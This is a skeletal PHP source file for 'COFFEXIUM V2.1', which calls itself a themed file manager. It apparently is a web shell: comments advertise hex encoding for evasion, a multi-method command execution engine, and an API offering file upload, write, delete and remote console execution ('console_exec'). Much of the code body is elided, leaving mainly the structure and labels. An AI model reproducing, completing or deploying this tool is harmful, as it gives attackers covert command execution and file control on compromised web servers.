<?php
// ============================================================================
// COFFEXIUM V2.1 - Merged File Manager (Coffee Chocolate theme + Hex Evasion)
...
// Helper for recursive deletion via Hex paths
...
// Helper to build archive for downloads
...
// ----------------------------------------------------------------------------
// ADVANCED MULTI-METHOD COMMAND EXECUTION ENGINE
// ----------------------------------------------------------------------------
class CommandExecutor {
    ...
    public static function getAvailableMethods() {
        ...
        // Filter out false values manually for PHP 4/5 compatibility
        $filtered = array();
...
// ----------------------------------------------------------------------------
// HEX JSON API ENDPOINT (Handles ALL Navigation, Reads, Writes, Edits, Deletes, Console)
// ----------------------------------------------------------------------------
    ...
    switch ($action) {
        ...
        case 'upload_hex':
            ...
            if ($fn_put_contents($filePath, $data !== false ? $data : '') !== false) {
                ...
                http_response_code(500); echo '{"status":"error","message":"Write permission error."}';
            }
            exit;
        ...
        case 'console_exec':
            ...
            // Execute via Advanced Multi-Method Engine
    ...
    <div class="header">
        <div class="header-top">
            <div class="logo">
                ...
                <span class="logo-text">COFF<span>EXIUM</span> V2.1</span>
            </div>
        </div>
    </div>
